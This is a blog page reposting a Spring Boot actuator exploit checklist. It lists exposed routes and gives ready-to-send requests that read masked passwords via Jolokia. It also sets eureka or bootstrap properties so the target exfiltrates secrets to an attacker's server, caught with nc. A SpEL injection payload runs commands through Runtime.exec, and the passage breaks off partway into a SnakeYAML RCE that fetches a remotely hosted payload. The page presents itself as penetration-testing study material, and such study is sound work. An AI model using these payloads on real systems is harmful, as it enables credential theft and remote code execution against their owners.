<!DOCTYPE html>
<html>

    <head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="本站由哨兵安全实验室支持创办">

<link rel="shortcut icon" href="/assets/img/favicon.png">
<link type="application/atom+xml" rel="alternate" href="/feed.xml" title="© 哨兵" />



<!-- Open Graph metadata -->
<meta property="og:type" content="website" />
<meta property="og:title" content="不得不谈的：「Spring Boot」未授权渗透 | © 哨兵" />
<meta property="og:description" content="本站由哨兵安全实验室支持创办" />
<meta property="og:image" content="https://sentrylab.cn/assets/img/logo-share.png" /> <!-- WeChat requires that thumbnail image is larger than 300x300 -->
<meta property="og:url" content="https://sentrylab.cn/blog/2020/Spring-boot/" />
<title> 不得不谈的：「Spring Boot」未授权渗透 | © 哨兵 | Sentry CyberSecurity</title>

<link rel="stylesheet" type="text/css" href="/assets/css/pace-minimal.css">
<script src="/assets/js/pace.min.js"></script>

<!--
script to install Ionic Framework @bin4xin. <https://ionic.io/ionicons/usage>
-->
<script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
<script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>

<!-- Bootstrap core CSS -->
<link href="/assets/css/bootstrap.css" rel="stylesheet">
<!-- Custom styles for this template -->
<link href="/assets/css/style.css" rel="stylesheet">
<link href="/assets/css/font-awesome.min.css" rel="stylesheet">
<link href="/assets/css/font-awesome-v4-shims.min.css" rel="stylesheet">
<link rel="stylesheet" href="/assets/css/404-style.css">


<script src="/assets/js/jquery.min.js"></script>
<script src="/assets/js/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
<script src="/assets/js/jquery.sticky/1.0.4/jquery.sticky.js"></script>
<script src="/assets/js/bootstrap.min.js"></script>


<!--mathjax-config scripts.-->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
        inlineMath: [['$$','$$']]
      }
    });
</script>
<script src="/assets/js/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<!--mathjax-config scripts stop.-->



</head>


    <body>

        <!-- Fixed navbar -->
<div class="navbar navbar-default navbar-fixed-top" role="navigation">
  <div class="container">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="/"><!--
   --><picture>
  <source srcset="/assets/img/logo-small-dark.png 1x, /assets/img/logo-small-dark@2x.png 2x, /assets/img/logo-small-dark@3x.png 3x, /assets/img/logo-small-dark@4x.png 4x" media="(prefers-color-scheme: dark)" />
  
  <img src="/assets/img/logo-small.jpg" srcset="/assets/img/logo-small.png 1x, /assets/img/logo-small@2x.png 2x, /assets/img/logo-small@3x.png 3x, /assets/img/logo-small@4x.png 4x" />
  </picture> © 哨兵</a>
    </div>
    <div class="navbar-collapse collapse navbar-right">

      <ul class="nav navbar-nav">
        
        <li ><a href="/">HOME</a></li>
        <li class="active"><a href="/blog/">BLOG</a></li>
<!--under construction <li ><a href="/categories/">CATEGORIES</a></li> -->
        <li ><a href="/daily/">DAILY</a></li>
        <li ><a href="/about/">ABOUT</a></li>
        <li ><a href="/feed.xml">RSS</a></li>
        <li ><a href="/usage/">QUICK START</a></li>
        
      </ul>
    </div><!--/.nav-collapse -->

  </div>
</div>

            <div class="container mtb">
    <div class="row">
        <!-- SINGLE POST -->
        <div class="col-lg-8">
            <!-- Blog Post  -->
            <a href="/blog/2020/Spring-boot/"><h3 class="ctitle">不得不谈的：「Spring Boot」未授权渗透</h3></a>
            <p><csmall>
              2020-09-25发布. | 
               未做修改 | 
               By: Bin4xin edited. Source from LandGrey.
            </csmall></p>
            <div class="post-content"> 
            <h4 id="spring-boot-vulnerability-exploit-checklist">Spring Boot Vulnerability Exploit CheckList</h4>

<p>Spring Boot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 check list</p>

<h3 id="声明">声明</h3>

<p><a href="https://github.com/LandGrey/SpringBootVulExploit">这是转载地址</a>，
<strong>若作者介意请联系：「chihou.pro@gmail.com」删除转载文章</strong></p>

<h2 id="零路由和版本">零：路由和版本</h2>

<h3 id="0x01路由知识">0x01：路由知识</h3>

<ul>
  <li>Spring Boot 1.x 版本默认内置路由的根路径以  <code class="language-plaintext highlighter-rouge">/</code> 开始，2.x 则统一以 <code class="language-plaintext highlighter-rouge">/actuator</code> 开始</li>
  <li>有些程序员会自定义 <code class="language-plaintext highlighter-rouge">/manage</code>、<code class="language-plaintext highlighter-rouge">/management</code> 或 <strong>项目相关名称</strong> 为根路径</li>
  <li>默认内置路由名字，如 <code class="language-plaintext highlighter-rouge">/env</code> 有时候也会被程序员修改，如修改成 <code class="language-plaintext highlighter-rouge">/appenv</code></li>
</ul>

<h3 id="0x02版本知识">0x02：版本知识</h3>

<blockquote>
  <p>Spring Cloud 是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合。</p>
</blockquote>

<h4 id="常见组件的版本相互依赖关系">常见组件的版本相互依赖关系：</h4>

<table>
  <thead>
    <tr>
      <th>依赖项</th>
      <th>版本列表及依赖组件版本</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>spring-boot-starter-parent</td>
      <td><a href="https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-parent">spring-boot-starter-parent</a></td>
    </tr>
    <tr>
      <td>spring-boot-dependencies</td>
      <td><a href="https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-dependencies">spring-boot-dependencies</a></td>
    </tr>
    <tr>
      <td>spring-cloud-dependencies</td>
      <td><a href="https://mvnrepository.com/artifact/org.springframework.cloud/spring-cloud-dependencies">spring-cloud-dependencies</a></td>
    </tr>
  </tbody>
</table>

<h4 id="spring-cloud-与-spring-boot-大版本之间的依赖关系">Spring Cloud 与 Spring Boot 大版本之间的依赖关系：</h4>

<table>
  <thead>
    <tr>
      <th>Spring Cloud</th>
      <th>Spring Boot</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Angel</td>
      <td>兼容 Spring Boot 1.2.x</td>
    </tr>
    <tr>
      <td>Brixton</td>
      <td>兼容 Spring Boot 1.3.x、1.4.x</td>
    </tr>
    <tr>
      <td>Camden</td>
      <td>兼容 Spring Boot 1.4.x、1.5.x</td>
    </tr>
    <tr>
      <td>Dalston</td>
      <td>兼容 Spring Boot 1.5.x，不兼容 2.0.x</td>
    </tr>
    <tr>
      <td>Edgware</td>
      <td>兼容 Spring Boot 1.5.x，不兼容 2.0.x</td>
    </tr>
    <tr>
      <td>Finchley</td>
      <td>兼容 Spring Boot 2.0.x，不兼容 1.5.x</td>
    </tr>
    <tr>
      <td>Greenwich</td>
      <td>兼容 Spring Boot 2.1.x</td>
    </tr>
    <tr>
      <td>Hoxton</td>
      <td>兼容 Spring Boot 2.2.x</td>
    </tr>
  </tbody>
</table>

<h4 id="spring-cloud-小版本号的后缀及含义">Spring Cloud 小版本号的后缀及含义:</h4>

<table>
  <thead>
    <tr>
      <th>版本号后缀</th>
      <th>含义</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>BUILD-SNAPSHOT</td>
      <td>快照版，代码不是固定，处于变化之中</td>
    </tr>
    <tr>
      <td>MX</td>
      <td>里程碑版</td>
    </tr>
    <tr>
      <td>RCX</td>
      <td>候选发布版</td>
    </tr>
    <tr>
      <td>RELEASE</td>
      <td>正式发布版</td>
    </tr>
    <tr>
      <td>SRX</td>
      <td>(修复错误和 bug 并再次发布的)正式发布版</td>
    </tr>
  </tbody>
</table>

<h2 id="一信息泄露">一：信息泄露</h2>

<h3 id="0x01路由地址及接口调用详情泄漏">0x01：路由地址及接口调用详情泄漏</h3>

<blockquote>
  <p>开发环境切换为线上生产环境时，相关人员没有更改配置文件或忘记切换配置环境，导致此漏洞</p>
</blockquote>

<p>直接访问以下几个路由，验证漏洞是否存在：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/api-docs
/v2/api-docs
/swagger-ui.html
</code></pre></div></div>

<p>一些可能会遇到的接口路由变形：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/api.html
/sw/swagger-ui.html
/api/swagger-ui.html
/template/swagger-ui.html
/spring-security-rest/api/swagger-ui.html
/spring-security-oauth-resource/swagger-ui.html
</code></pre></div></div>

<p>除此之外，下面的路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/mappings
/actuator/mappings
/metrics
/actuator/metrics
/beans
/actuator/beans
/configprops
/actuator/configprops
</code></pre></div></div>

<p><strong>一般来讲，知道 spring boot 应用的相关接口和传参信息并不能算是漏洞</strong>；</p>

<p>但是可以检查暴露的接口是否存在未授权访问、越权或者其他业务型漏洞。</p>

<h3 id="0x02配置不当而暴露的路由">0x02：配置不当而暴露的路由</h3>

<blockquote>
  <p>主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置</p>
</blockquote>

<p>参考 <a href="https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#production-ready-endpoints">production-ready-endpoints</a> 和 <a href="https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt">spring-boot.txt</a>，可能因为配置不当而暴露的默认内置路由可能会有：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/actuator
/auditevents
/autoconfig
/beans
/caches
/conditions
/configprops
/docs
/dump
/env
/flyway
/health
/heapdump
/httptrace
/info
/intergrationgraph
/jolokia
/logfile
/loggers
/liquibase
/metrics
/mappings
/prometheus
/refresh
/scheduledtasks
/sessions
/shutdown
/trace
/threaddump
/actuator/auditevents
/actuator/beans
/actuator/health
/actuator/conditions
/actuator/configprops
/actuator/env
/actuator/info
/actuator/loggers
/actuator/heapdump
/actuator/threaddump
/actuator/metrics
/actuator/scheduledtasks
/actuator/httptrace
/actuator/mappings
/actuator/jolokia
/actuator/hystrix.stream
</code></pre></div></div>

<p>其中对寻找漏洞比较重要接口的有：</p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">/env</code>、<code class="language-plaintext highlighter-rouge">/actuator/env</code></p>

    <p>GET 请求 <code class="language-plaintext highlighter-rouge">/env</code> 会泄露环境变量信息，或者配置中的一些用户名，当程序员的属性名命名不规范 (例如 password 写成 psasword、pwd) 时，会泄露密码明文；</p>

    <p>同时有一定概率可以通过 POST 请求 <code class="language-plaintext highlighter-rouge">/env</code> 接口设置一些属性，触发相关 RCE 漏洞。</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">/jolokia</code></p>

    <p>通过 <code class="language-plaintext highlighter-rouge">/jolokia/list</code> 接口寻找可以利用的 MBean，触发相关 RCE 漏洞；</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">/trace</code></p>

    <p>一些 http 请求包访问跟踪信息，有可能发现有效的 cookie 信息</p>
  </li>
</ul>

<h3 id="0x03获取被星号脱敏的密码的明文-方法一">0x03：获取被星号脱敏的密码的明文 (方法一)</h3>

<blockquote>
  <p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p>
</blockquote>

<h4 id="利用条件">利用条件：</h4>

<ul>
  <li>目标网站存在 <code class="language-plaintext highlighter-rouge">/jolokia</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/jolokia</code> 接口</li>
  <li>目标使用了 <code class="language-plaintext highlighter-rouge">jolokia-core</code> 依赖（版本要求暂未知）</li>
</ul>

<h4 id="利用方法">利用方法：</h4>

<h5 id="步骤一-找到想要获取的属性名">步骤一： 找到想要获取的属性名</h5>

<p>GET 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/env</code> 接口，搜索 <code class="language-plaintext highlighter-rouge">******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>

<h5 id="步骤二-jolokia-调用相关-mbean-获取明文">步骤二： jolokia 调用相关 Mbean 获取明文</h5>

<p>将下面示例中的 <code class="language-plaintext highlighter-rouge">security.user.password</code> 替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 <code class="language-plaintext highlighter-rouge">value</code> 键中。</p>

<ul>
  <li>调用 <code class="language-plaintext highlighter-rouge">org.springframework.boot</code> Mbean（<strong>可能更通用</strong>）</li>
</ul>

<blockquote>
  <p>实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法</p>
</blockquote>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /jolokia
Content-Type: application/json

{"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/jolokia
Content-Type: application/json

{"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
</code></pre></div></div>

<ul>
  <li>调用 <code class="language-plaintext highlighter-rouge">org.springframework.cloud.context.environment</code> Mbean（<strong>需要 spring cloud 相关依赖</strong>）</li>
</ul>

<blockquote>
  <p>实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法</p>
</blockquote>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /jolokia
Content-Type: application/json

{"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/jolokia
Content-Type: application/json

{"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
</code></pre></div></div>

<h3 id="0x04获取被星号脱敏的密码的明文-方法二">0x04：获取被星号脱敏的密码的明文 (方法二)</h3>

<blockquote>
  <p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p>
</blockquote>

<h4 id="利用条件-1">利用条件：</h4>

<ul>
  <li>可以 GET 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code></li>
  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code></li>
  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/refresh</code> 接口刷新配置（存在 <code class="language-plaintext highlighter-rouge">spring-boot-starter-actuator</code> 依赖）</li>
  <li>目标使用了 <code class="language-plaintext highlighter-rouge">spring-cloud-starter-netflix-eureka-client</code> 依赖</li>
  <li>目标可以请求攻击者的服务器（请求可出外网）</li>
</ul>

<h4 id="利用方法-1">利用方法：</h4>

<h5 id="步骤一-找到想要获取的属性名-1">步骤一： 找到想要获取的属性名</h5>

<p>GET 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/env</code> 接口，搜索 <code class="language-plaintext highlighter-rouge">******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>

<h5 id="步骤二-使用-nc-监听-http-请求">步骤二： 使用 nc 监听 HTTP 请求</h5>

<p>在自己控制的外网服务器上监听 80 端口：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvk</span> 80
</code></pre></div></div>

<h5 id="步骤三-设置-eurekaclientserviceurldefaultzone-属性">步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性</h5>

<p>将下面 <code class="language-plaintext highlighter-rouge">http://value:${security.user.password}@your-vps-ip</code>  中的  <code class="language-plaintext highlighter-rouge">security.user.password</code> 换成自己想要获取的对应的星号 * 遮掩的属性名；</p>

<p><code class="language-plaintext highlighter-rouge">your-vps-ip</code> 换成自己外网服务器的真实 ip 地址。</p>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /env
Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://value:${security.user.password}@your-vps-ip
</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/env
Content-Type: application/json

{"name":"eureka.client.serviceUrl.defaultZone","value":"http://value:${security.user.password}@your-vps-ip"}
</code></pre></div></div>

<h5 id="步骤四-刷新配置">步骤四： 刷新配置</h5>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /refresh
Content-Type: application/x-www-form-urlencoded

</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/refresh
Content-Type: application/json

</code></pre></div></div>

<h5 id="步骤五-解码属性值">步骤五： 解码属性值</h5>

<p>正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 <code class="language-plaintext highlighter-rouge">Authorization</code> 头内容：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Authorization: Basic dmFsdWU6MTIzNDU2
</code></pre></div></div>

<p>将其中的 <code class="language-plaintext highlighter-rouge">dmFsdWU6MTIzNDU2</code>部分使用 base64 解码，即可获得类似明文值 <code class="language-plaintext highlighter-rouge">value:123456</code>，其中的 <code class="language-plaintext highlighter-rouge">123456</code> 即是目标星号 * 脱敏前的属性值明文。</p>

<h3 id="0x05获取被星号脱敏的密码的明文-方法三">0x05：获取被星号脱敏的密码的明文 (方法三)</h3>

<blockquote>
  <p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p>
</blockquote>

<h4 id="利用条件-2">利用条件：</h4>

<ul>
  <li>通过 POST <code class="language-plaintext highlighter-rouge">/env</code> 设置属性触发目标对外网指定地址发起任意 http 请求</li>
  <li>目标可以请求攻击者的服务器（请求可出外网）</li>
</ul>

<h4 id="利用方法-2">利用方法：</h4>

<blockquote>
  <p>参考 UUUUnotfound 提出的 <a href="https://github.com/LandGrey/SpringBootVulExploit/issues/1">issue-1</a>，可以在目标发外部 http 请求的过程中，在 url path 中利用占位符带出数据</p>
</blockquote>

<h5 id="步骤一-找到想要获取的属性名-2">步骤一： 找到想要获取的属性名</h5>

<p>GET 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/env</code> 接口，搜索 <code class="language-plaintext highlighter-rouge">******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>

<h5 id="步骤二-使用-nc-监听-http-请求-1">步骤二： 使用 nc 监听 HTTP 请求</h5>

<p>在自己控制的外网服务器上监听 80 端口：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvk</span> 80
</code></pre></div></div>

<h5 id="步骤三-触发对外-http-请求">步骤三： 触发对外 http 请求</h5>

<ul>
  <li><code class="language-plaintext highlighter-rouge">spring.cloud.bootstrap.location</code> 方法（<strong>同时适用于</strong>明文数据中有特殊 url 字符的情况）：</li>
</ul>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /env
Content-Type: application/x-www-form-urlencoded

spring.cloud.bootstrap.location=http://your-vps-ip/?=${security.user.password}
</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/env
Content-Type: application/json

{"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip/?=${security.user.password}"}
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">eureka.client.serviceUrl.defaultZone</code> 方法（<strong>不适用于</strong>明文数据中有特殊 url 字符的情况）：</li>
</ul>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /env
Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://your-vps-ip/${security.user.password}
</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/env
Content-Type: application/json

{"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/${security.user.password}"}
</code></pre></div></div>

<h5 id="步骤四-刷新配置-1">步骤四： 刷新配置</h5>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /refresh
Content-Type: application/x-www-form-urlencoded

</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/refresh
Content-Type: application/json

</code></pre></div></div>

<h3 id="0x06获取被星号脱敏的密码的明文-方法四">0x06：获取被星号脱敏的密码的明文 (方法四)</h3>

<blockquote>
  <p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p>
</blockquote>

<h4 id="利用条件-3">利用条件：</h4>

<ul>
  <li>可正常 GET 请求目标 <code class="language-plaintext highlighter-rouge">/heapdump</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/heapdump</code> 接口</li>
</ul>

<h4 id="利用方法-3">利用方法：</h4>

<h5 id="步骤一-找到想要获取的属性名-3">步骤一： 找到想要获取的属性名</h5>

<p>GET 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/env</code> 接口，搜索 <code class="language-plaintext highlighter-rouge">******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>

<h5 id="步骤二-下载-jvm-heap-信息">步骤二： 下载 jvm heap 信息</h5>

<blockquote>
  <p>下载的 heapdump 文件大小通常在 50M—500M 之间，有时候也可能会大于 2G</p>
</blockquote>

<p><code class="language-plaintext highlighter-rouge">GET</code> 请求目标的 <code class="language-plaintext highlighter-rouge">/heapdump</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/heapdump</code> 接口，下载应用实时的 JVM 堆信息</p>

<h5 id="步骤三-使用-mat-获得-jvm-heap-中的密码明文">步骤三： 使用 MAT 获得 jvm heap 中的密码明文</h5>

<p>参考 <a href="https://landgrey.me/blog/16/">文章</a> 方法，使用 <a href="https://www.eclipse.org/mat/downloads.php">Eclipse Memory Analyzer</a> 工具的 OQL 语句 <code class="language-plaintext highlighter-rouge">select * from org.springframework.web.context.support.StandardServletEnvironment</code>， 辅助快速过滤分析，获得密码明文</p>

<h2 id="二远程代码执行">二：远程代码执行</h2>

<blockquote>
  <p>由于 spring boot 相关漏洞可能是多个组件漏洞组合导致的，所以有些漏洞名字起的不太正规，以能区分为准</p>
</blockquote>

<h3 id="0x01whitelabel-error-page-spel-rce">0x01：whitelabel error page SpEL RCE</h3>

<h4 id="利用条件-4">利用条件：</h4>

<ul>
  <li>spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</li>
  <li>至少知道一个触发 springboot 默认错误页面的接口及参数名</li>
</ul>

<h4 id="利用方法-4">利用方法：</h4>

<h5 id="步骤一找到一个正常传参处">步骤一：找到一个正常传参处</h5>

<p>比如发现访问  <code class="language-plaintext highlighter-rouge">/article?id=xxx</code> ，页面会报状态码为 500 的错误： <code class="language-plaintext highlighter-rouge">Whitelabel Error Page</code>，则后续 payload 都将会在参数 id 处尝试。</p>

<h5 id="步骤二执行-spel-表达式">步骤二：执行 SpEL 表达式</h5>

<p>输入 <code class="language-plaintext highlighter-rouge">/article?id=${7*7}</code> ，如果发现报错页面将 7*7 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。</p>

<p>由字符串格式转换成 <code class="language-plaintext highlighter-rouge">0x**</code> java 字节形式，方便执行任意代码：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># coding: utf-8
</span>
<span class="n">result</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">target</span> <span class="o">=</span> <span class="s">'open -a Calculator'</span>
<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">target</span><span class="p">:</span>
    <span class="n">result</span> <span class="o">+=</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">))</span> <span class="o">+</span> <span class="s">","</span>
<span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s">','</span><span class="p">))</span>
</code></pre></div></div>

<p>执行 <code class="language-plaintext highlighter-rouge">open -a Calculator</code> 命令</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span><span class="o">{</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">).</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="k">new</span> <span class="nc">String</span><span class="o">(</span><span class="k">new</span> <span class="kt">byte</span><span class="o">[]{</span><span class="mh">0x6f</span><span class="o">,</span><span class="mh">0x70</span><span class="o">,</span><span class="mh">0x65</span><span class="o">,</span><span class="mh">0x6e</span><span class="o">,</span><span class="mh">0x20</span><span class="o">,</span><span class="mh">0x2d</span><span class="o">,</span><span class="mh">0x61</span><span class="o">,</span><span class="mh">0x20</span><span class="o">,</span><span class="mh">0x43</span><span class="o">,</span><span class="mh">0x61</span><span class="o">,</span><span class="mh">0x6c</span><span class="o">,</span><span class="mh">0x63</span><span class="o">,</span><span class="mh">0x75</span><span class="o">,</span><span class="mh">0x6c</span><span class="o">,</span><span class="mh">0x61</span><span class="o">,</span><span class="mh">0x74</span><span class="o">,</span><span class="mh">0x6f</span><span class="o">,</span><span class="mh">0x72</span><span class="o">}))}</span>
</code></pre></div></div>

<h4 id="漏洞原理">漏洞原理：</h4>

<ol>
  <li>spring boot 处理参数值出错，流程进入 <code class="language-plaintext highlighter-rouge">org.springframework.util.PropertyPlaceholderHelper</code> 类中</li>
  <li>此时 URL 中的参数值会用 <code class="language-plaintext highlighter-rouge">parseStringValue</code> 方法进行递归解析</li>
  <li>其中  <code class="language-plaintext highlighter-rouge">${}</code>  包围的内容都会被 <code class="language-plaintext highlighter-rouge">org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code> 类的 <code class="language-plaintext highlighter-rouge">resolvePlaceholder</code> 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞</li>
</ol>

<h4 id="漏洞分析">漏洞分析：</h4>

<p>​	<a href="https://www.cnblogs.com/litlife/p/10183137.html">SpringBoot SpEL表达式注入漏洞-分析与复现</a></p>

<h4 id="漏洞环境">漏洞环境：</h4>

<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce">repository/springboot-spel-rce</a></p>

<p>正常访问：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:9091/article?id=66
</code></pre></div></div>

<p>执行 <code class="language-plaintext highlighter-rouge">open -a Calculator</code> 命令：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">http:</span><span class="c1">//127.0.0.1:9091/article?id=${T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}</span>
</code></pre></div></div>

<h3 id="0x02spring-cloud-snakeyaml-rce">0x02：spring cloud SnakeYAML RCE</h3>

<h4 id="利用条件-5">利用条件：</h4>

<ul>
  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code> 接口设置属性</li>
  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/refresh</code> 接口刷新配置（存在 <code class="language-plaintext highlighter-rouge">spring-boot-starter-actuator</code> 依赖）</li>
  <li>目标依赖的 <code class="language-plaintext highlighter-rouge">spring-cloud-starter</code> 版本 &lt; 1.3.0.RELEASE</li>
  <li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li>
</ul>

<h4 id="利用方法-5">利用方法：</h4>

<h5 id="步骤一-托管-yml-和-jar-文件">步骤一： 托管 yml 和 jar 文件</h5>

<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 使用 python 快速开启 http server</span>

python2 <span class="nt">-m</span> SimpleHTTPServer 80
python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div>

<p>在网站根目录下放置后缀为 <code class="language-plaintext highlighter-rouge">yml</code> 的文件  <code class="language-plaintext highlighter-rouge">example.yml</code>，内容如下：</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">!!javax.script.ScriptEngineManager</span> <span class="pi">[</span>
